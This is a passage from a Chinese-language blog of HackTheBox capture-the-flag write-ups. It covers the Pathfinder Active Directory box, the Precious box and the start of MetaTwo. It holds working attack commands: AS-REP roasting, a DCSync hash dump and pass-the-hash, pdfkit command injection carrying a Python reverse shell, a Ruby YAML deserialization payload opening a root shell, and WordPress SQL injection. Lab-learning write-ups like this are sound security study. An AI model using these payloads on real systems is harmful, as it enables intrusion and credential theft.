RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">9389/tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">Service Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><blockquote><p>使用上一台靶机的凭证<code>sandra:Password1234!</code>来枚举AD的信息 – 官方WP</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d megacorp.local -u sandra -p <span class="string">&quot;Password1234!&quot;</span> -gc pathfinder.megacorp.local -c all -ns 10.10.10.30</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo4j console</span><br><span class="line">bloodhound</span><br></pre></td></tr></table></figure><p>json打包为zip后放进bloodhound<br />自己用在kali用bloodhound的时候总是莫名其妙的崩溃, 只能在windows上使用了<br />需要改一下neo4j所监听的ip, 默认是监听本地环回, 需要改成一个windows上能够访问到的ip</p><p>通过分析<code>Find Principals with DCSync Rights</code><br />可以看到用户SVC_BES有权限<code>GetChanges</code>&amp;<code>GetchangesAll</code></p><blockquote><p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br /><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a></p></blockquote><blockquote><p>mimikatz有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />《内网安全攻防》 P.296</p></blockquote><p>如果能够拿到用户<code>svc_bes</code>的凭证, 就能够使用dcsync攻击<br />所以尝试获取用户<code>svc_bes</code>的Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30</span><br><span class="line"></span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> svc_bes</span><br><span class="line">$krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL:9b7a931e1152a4631d23173e921373ee<span class="variable">$7282d47fdf6ebddcd09f8233636ee97c971b39333ded23097d3fb59c4fb1dfbd772cb3b08b8a8f40a69f69a07f242e0ee2520878b707ab9769208ba2bd6faa76c0a79b39384ef588651127c3164fff013b53d0968d4047dad049b46747b52629c6c9b92427fc7bd6dca13a923bdb833ca9273c2018b605a9eeb0c24005b5ba8988b76952db3a31f6b14f165bd0613e7130ee1bc93cb9a0e4f7a018cbf3913b935778e860d3236d2763b56d871e236e98ea041bbb5b15ebf3138ca16214a758b24194d968320151e58d09a89c2d08e4576ab789076cba4096b4fb328965611663cbe588eafd5bf19af71293701d8a220e</span></span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">Sheffield19      ($krb5asrep$23<span class="variable">$svc_bes</span>@MEGACORP.LOCAL)</span><br></pre></td></tr></table></figure><p>这里本来打算用psexec直接登入, 但是出现了权限不足的错误<br /><s><code>python psexec.py megacorp.local/svc_bes@10.10.10.30</code></s></p><p>使用Winrm服务登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19</span><br><span class="line"><span class="built_in">type</span> C:\users\svc_bes\desktop\user.txt</span><br><span class="line">b05fb166688a8603d970c6d033f637f1</span><br></pre></td></tr></table></figure><p>dcsync攻击</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::</span><br></pre></td></tr></table></figure><p>使用Hash登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py megacorp.local/administraor@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line">ee613b2d048303e5fd4ac6647d944645</span><br></pre></td></tr></table></figure><hr /><p>几台靶机下来还是学到了不少东西<br /><s>还是自己太菜了</s><br />剩下的StartPoint靶机需要VIP才能访问<br />等哪天心血来潮开了VIP再说吧</p><hr /><h1 id="hackthebox_precious"><a class="markdownIt-Anchor" href="#hackthebox_precious"></a> HackTheBox_Precious</h1><h2 id="信息收集-3"><a class="markdownIt-Anchor" href="#信息收集-3"></a> 信息收集</h2><h3 id="端口扫描-20"><a class="markdownIt-Anchor" href="#端口扫描-20"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.189</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> precious.htb (10.10.11.189)</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80/tcp open  http    nginx 1.18.0</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>未枚举出路径</p><h2 id="漏洞利用-18"><a class="markdownIt-Anchor" href="#漏洞利用-18"></a> 漏洞利用</h2><p>访问80端口的WEB服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.189/ -I</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 02:20:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;precious.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名precious.htb</p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.189\tprecious.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>使用域名可以进行访问</p><p>本地开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; python -m http.server 80</span><br></pre></td></tr></table></figure><p>将本地HTTP服务页面转为PDF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb -d <span class="string">&quot;url=http://10.10.*.*/&quot;</span> -o pdf</span><br></pre></td></tr></table></figure><p>查看文件EXIF信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool pdf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : 11.16</span><br><span class="line">File Name                       : pdf</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 22 kB</span><br><span class="line">File Modification Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Access Date&#x2F;Time           : 2023:03:02 10:42:33+08:00</span><br><span class="line">File Inode Change Date&#x2F;Time     : 2023:03:02 10:42:26+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : PDF</span><br><span class="line">File Type Extension             : pdf</span><br><span class="line">MIME Type                       : application&#x2F;pdf</span><br><span class="line">PDF Version                     : 1.4</span><br><span class="line">Linearized                      : No</span><br><span class="line">Page Count                      : 1</span><br><span class="line">Creator                         : Generated by pdfkit v0.8.6</span><br></pre></td></tr></table></figure><p>搜索<code>pdfkit v0.8.6</code>，找到相关漏洞CVE-2022-25765</p><blockquote><p><a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795</a></p></blockquote><p>验证漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60id%60&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.189 - - [02&#x2F;Mar&#x2F;2023 11:34:00] &quot;GET &#x2F;?name&#x3D;%20uid&#x3D;1001(ruby)%20gid&#x3D;1001(ruby)%20groups&#x3D;1001(ruby) HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://precious.htb/ -d <span class="string">&quot;url=http%3A//10.10.*.*/%3Fname%3D%2520%60python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.*.*%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22%60&quot;</span></span><br></pre></td></tr></table></figure><p>获取tty</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/ruby/.bundle/config</span><br></pre></td></tr></table></figure><p>得到用户henry的账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">BUNDLE_HTTPS:&#x2F;&#x2F;RUBYGEMS__ORG&#x2F;: &quot;henry:Q3c1AqGHtoI0aXAYFH&quot;</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh henry@10.10.11.189</span><br><span class="line">Q3c1AqGHtoI0aXAYFH</span><br></pre></td></tr></table></figure><p>查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/henry/user.txt </span><br><span class="line">c2495bbeca89a6c2caaabb23a05934a9</span><br></pre></td></tr></table></figure><h2 id="权限提升-19"><a class="markdownIt-Anchor" href="#权限提升-19"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for henry on precious:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin</span><br><span class="line"></span><br><span class="line">User henry may run the following commands on precious:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;ruby &#x2F;opt&#x2F;update_dependencies.rb</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat update_dependencies.rb</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Compare installed dependencies with those specified in &quot;dependencies.yml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;yaml&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rubygems&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> update versions automatically</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_gems</span><span class="params">()</span></span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_from_file</span></span></span><br><span class="line">    YAML.load(File.read(<span class="string">&quot;dependencies.yml&quot;</span>))</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_local_gems</span></span></span><br><span class="line">    Gem::Specification.sort_by&#123; <span class="params">|g|</span> [g.name.downcase, g.version] &#125;.map&#123;<span class="params">|g|</span> [g.name, g.version.to_s]&#125;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">gems_file = list_from_file</span><br><span class="line">gems_local = list_local_gems</span><br><span class="line"></span><br><span class="line">gems_file.each <span class="keyword">do</span> <span class="params">|file_name, file_version|</span></span><br><span class="line">    gems_local.each <span class="keyword">do</span> <span class="params">|local_name, local_version|</span></span><br><span class="line">        <span class="keyword">if</span>(file_name == local_name)</span><br><span class="line">            <span class="keyword">if</span>(file_version != local_version)</span><br><span class="line">                puts <span class="string">&quot;Installed version differs from the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                puts <span class="string">&quot;Installed version is equals to the one specified in file: &quot;</span> + local_name</span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>YAML.load()存在反序列化漏洞</p><blockquote><p><a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/</a></p></blockquote><p>构造能够利用漏洞的yml文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp; vi /tmp/dependencies.yml</span><br></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Installer</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">x</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::SpecFetcher</span></span><br><span class="line">    <span class="attr">i:</span> <span class="string">y</span></span><br><span class="line"><span class="bullet">-</span> <span class="type">!ruby/object:Gem::Requirement</span></span><br><span class="line">  <span class="attr">requirements:</span></span><br><span class="line">    <span class="type">!ruby/object:Gem::Package::TarReader</span></span><br><span class="line">    <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::BufferedIO</span></span><br><span class="line">      <span class="attr">io:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::Package::TarReader::Entry</span></span><br><span class="line">         <span class="attr">read:</span> <span class="number">0</span></span><br><span class="line">         <span class="attr">header:</span> <span class="string">&quot;abc&quot;</span></span><br><span class="line">      <span class="attr">debug_output:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">         <span class="attr">socket:</span> <span class="string">&amp;1</span> <span class="type">!ruby/object:Gem::RequestSet</span></span><br><span class="line">             <span class="attr">sets:</span> <span class="type">!ruby/object:Net::WriteAdapter</span></span><br><span class="line">                 <span class="attr">socket:</span> <span class="type">!ruby/module</span> <span class="string">&#x27;Kernel&#x27;</span></span><br><span class="line">                 <span class="attr">method_id:</span> <span class="string">:system</span></span><br><span class="line">             <span class="attr">git_set:</span> <span class="string">&quot;python3 -c \&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9997));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span></span><br><span class="line">         <span class="attr">method_id:</span> <span class="string">:resolve</span></span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>触发反序列化漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/ruby /opt/update_dependencies.rb</span><br></pre></td></tr></table></figure><p>获得root权限，查看flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">a6c3884ed3b917b870834758ab46f9f1</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_metatwo"><a class="markdownIt-Anchor" href="#hackthebox_metatwo"></a> HackTheBox_MetaTwo</h1><h2 id="信息收集-4"><a class="markdownIt-Anchor" href="#信息收集-4"></a> 信息收集</h2><h3 id="端口扫描-21"><a class="markdownIt-Anchor" href="#端口扫描-21"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.186</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.186</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 828 closed ports, 169 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port21-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;2%Time&#x3D;64009A16%P&#x3D;x86_64-pc-linux-gnu%r(Gener</span><br><span class="line">SF:icLines,8F,&quot;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.</span><br><span class="line">SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea</span><br><span class="line">SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\</span><br><span class="line">SF:r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举-2"><a class="markdownIt-Anchor" href="#路径枚举-2"></a> 路径枚举</h3><p>请求WEB页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.11.186 -I</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 12:39:11 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;metapress.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名<code>metapress.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.186\tmetapress.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问页面是个Wordpress，没必要枚举了</p><h2 id="漏洞利用-19"><a class="markdownIt-Anchor" href="#漏洞利用-19"></a> 漏洞利用</h2><p>枚举用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://metapress.htb/&quot;</span> -e u</span><br></pre></td></tr></table></figure><p>部分信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[+] robots.txt found: http:&#x2F;&#x2F;metapress.htb&#x2F;robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line"> [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line"> [+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Sitemap (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-sitemap-users-1.xml</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] manager</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>访问页面<code>http://metapress.htb/events/</code></p><p>在HTML代码中找到以下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;metapress.htb&#x2F;wp-content&#x2F;plugins&#x2F;bookingpress-appointment-booking&#x2F;css&#x2F;bookingpress_element_theme.css?ver&#x3D;1.0.10</span><br></pre></td></tr></table></figure><p>确定该插件为 <code>bookingpress-appointment-booking 1.0.10</code></p><p>google得到相关漏洞</p><blockquote><p><a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p></blockquote><p>源代码中搜索<code>action:'bookingpress_front_get_category_services'</code></p><p>得到_wpnonce=7ea553b73c</p><p>进行手工SQL注入</p><p>查库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(schema_name) from information_schema.schemata-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>库名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">blog</span><br></pre></td></tr></table></figure><p>查表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span 